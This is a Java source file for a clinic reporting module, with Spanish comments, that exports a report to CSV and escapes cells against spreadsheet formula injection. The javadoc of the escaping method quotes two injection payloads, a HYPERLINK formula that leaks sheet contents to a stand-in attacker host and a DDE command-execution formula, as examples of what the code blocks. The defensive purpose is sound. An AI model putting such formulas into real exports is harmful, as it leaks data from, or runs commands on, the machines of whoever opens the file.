package com.akine.reporting.application;

import com.akine.reporting.spi.AdvertenciaDeReporte;
import com.akine.reporting.spi.AporteDeReporte;
import com.akine.reporting.spi.FilaDeReporte;
import com.akine.reporting.spi.IndicadorDeReporte;
import org.springframework.stereotype.Component;

/**
 * Serializa un {@link ReporteView} a CSV (RF-M23-006).
 *
 * <h2>El export NO tiene su propia consulta</h2>
 *
 * <p>Recibe el {@code ReporteView} que ya produjo {@link ReporteService}, el mismo que va a la
 * pantalla. La alternativa —una query optimizada para el archivo— <b>garantiza que algun dia la
 * pantalla y el CSV digan cosas distintas y que nadie sepa cual de las dos miente</b>. Es el mismo
 * riesgo que un agregado materializado, en chico.
 *
 * <h2>Que se escribe, y por que en ese orden</h2>
 *
 * <p>Cabecera con el periodo, la zona y el instante de la corrida; despues, por cada seccion, sus
 * indicadores <b>con su fuente y su criterio de fecha</b>, y su detalle si lo tiene. Al final, lo
 * omitido y las advertencias.
 *
 * <p><b>La fuente viaja en el archivo y no solo en la pantalla.</b> Un CSV sobrevive a la sesion
 * que lo genero: llega por mail, se abre en una planilla y alguien le suma una columna a otra. Si
 * el archivo no dice que {@code cobrado} sale de M19 y {@code caja-ingresos-efectivo} de M20, esa
 * suma se hace sola.
 *
 * <h2>El escapado</h2>
 *
 * <p>Se entrecomilla siempre y se duplican las comillas internas (RFC 4180). Siempre y no "cuando
 * hace falta": un concepto con una coma, un salto de linea en un motivo o un nombre con comillas
 * corren el resto de las columnas, y el archivo no falla — se lee mal.
 */
@Component
public class ExportadorCsv {

	private static final String SEPARADOR = ",";
	private static final String FIN_DE_LINEA = "\r\n";

	public String aCsv(ReporteView vista) {
		StringBuilder csv = new StringBuilder(1024);

		linea(csv, "Reporte", vista.reporte().name());
		linea(csv, "Consultorio", String.valueOf(vista.consultorioId()));
		linea(csv, "Desde", vista.desde().toString());
		linea(csv, "Hasta", vista.hasta().toString());
		linea(csv, "Zona horaria", vista.zona());
		linea(csv, "Generado en", vista.generadoEn().toString());
		csv.append(FIN_DE_LINEA);

		for (AporteDeReporte seccion : vista.secciones()) {
			linea(csv, "Seccion", seccion.titulo());

			if (!seccion.indicadores().isEmpty()) {
				linea(csv, "Indicador", "Valor", "Tipo", "Moneda", "Fuente", "Criterio de fecha");
				for (IndicadorDeReporte indicador : seccion.indicadores()) {
					linea(csv,
							indicador.etiqueta(),
							indicador.valor().toPlainString(),
							indicador.tipo().name(),
							indicador.moneda() == null ? "" : indicador.moneda(),
							indicador.fuente() == null ? "" : indicador.fuente(),
							indicador.criterioDeFecha() == null ? "" : indicador.criterioDeFecha());
				}
			}

			if (!seccion.columnas().isEmpty()) {
				csv.append(FIN_DE_LINEA);
				linea(csv, seccion.columnas().toArray(String[]::new));
				for (FilaDeReporte fila : seccion.filas()) {
					linea(csv, fila.celdas().toArray(String[]::new));
				}
			}
			csv.append(FIN_DE_LINEA);
		}

		if (!vista.omitidas().isEmpty()) {
			linea(csv, "Secciones omitidas", "Permiso que falta");
			for (ReporteView.SeccionOmitida omitida : vista.omitidas()) {
				linea(csv, omitida.seccion(), omitida.permisoRequerido());
			}
			csv.append(FIN_DE_LINEA);
		}

		if (!vista.advertencias().isEmpty()) {
			linea(csv, "Advertencia", "Seccion", "Detalle");
			for (AdvertenciaDeReporte advertencia : vista.advertencias()) {
				linea(csv, advertencia.codigo(), advertencia.seccion(), advertencia.detalle());
			}
		}

		return csv.toString();
	}

	private static void linea(StringBuilder csv, String... celdas) {
		for (int i = 0; i < celdas.length; i++) {
			if (i > 0) {
				csv.append(SEPARADOR);
			}
			csv.append(escapar(celdas[i]));
		}
		csv.append(FIN_DE_LINEA);
	}

	/**
	 * Caracteres con los que una planilla interpreta la celda como <b>formula</b> y no como texto.
	 *
	 * <p>Los cuatro de siempre mas el tabulador y el retorno de carro, que Excel tambien usa como
	 * arranque de formula cuando la celda se pega desde el portapapeles.
	 */
	private static final String ARRANQUES_DE_FORMULA = "=+-@\t\r";

	/**
	 * Escapa la celda para CSV <b>y</b> para la planilla que la va a abrir. No son lo mismo.
	 *
	 * <h2>Las comillas no alcanzan</h2>
	 *
	 * <p>El entrecomillado de RFC 4180 resuelve el parseo —separadores, comillas y saltos de
	 * linea dentro del valor— y <b>no evita que Excel y LibreOffice evaluen</b> una celda que
	 * empieza con {@code =}, {@code +}, {@code -} o {@code @}. Una celda
	 * {@code =HYPERLINK("http://atacante/?"&A1,"Click")} filtra el contenido de la planilla al
	 * abrirla, y {@code =cmd|'/c calc'!A1} ejecuta en las versiones que todavia honran DDE. El
	 * archivo se sirve con {@code Content-Disposition: attachment} y el javadoc de esta clase ya
	 * dice cual es su destino: llega por mail y se abre en una planilla.
	 *
	 * <h2>Por que se agrega si hoy no es explotable</h2>
	 *
	 * <p>Porque hoy no lo es <b>por accidente</b>: ninguna celda que llega al CSV es texto libre
	 * del usuario —son fechas, enums de la base, ids y {@code BigDecimal}, y los titulos son
	 * constantes—. Pero {@code FilaDeReporte} no valida nada y el SPI invita explicitamente a que
	 * cada modulo aporte su seccion: la primera fila con un nombre de financiador, un concepto o
	 * un motivo —todos texto libre del tenant— convierte el export en un vector sin que nadie
	 * toque esta clase. La proteccion va donde se escribe la celda, que es el unico lugar por el
	 * que pasan todas.
	 *
	 * <h2>Por que apostrofo y no borrar el caracter</h2>
	 *
	 * <p>Un apostrofo inicial es la convencion que las planillas entienden como "esto es texto":
	 * el valor se ve completo y no se pierde informacion, que es lo que si pasaria recortando el
	 * primer caracter. Un importe negativo como {@code -1500,00} sigue leyendose; deja de ser un
	 * numero para la planilla, y eso es el precio, asumido: los importes del reporte salen de
	 * {@code toPlainString()} y el consumidor es una persona leyendo, no una hoja de calculo.
	 */
	private static String escapar(String celda) {
		String valor = celda == null ? "" : celda;
		if (!valor.isEmpty() && ARRANQUES_DE_FORMULA.indexOf(valor.charAt(0)) >= 0) {
			valor = "'" + valor;
		}
		return '"' + valor.replace("\"", "\"\"") + '"';
	}
}
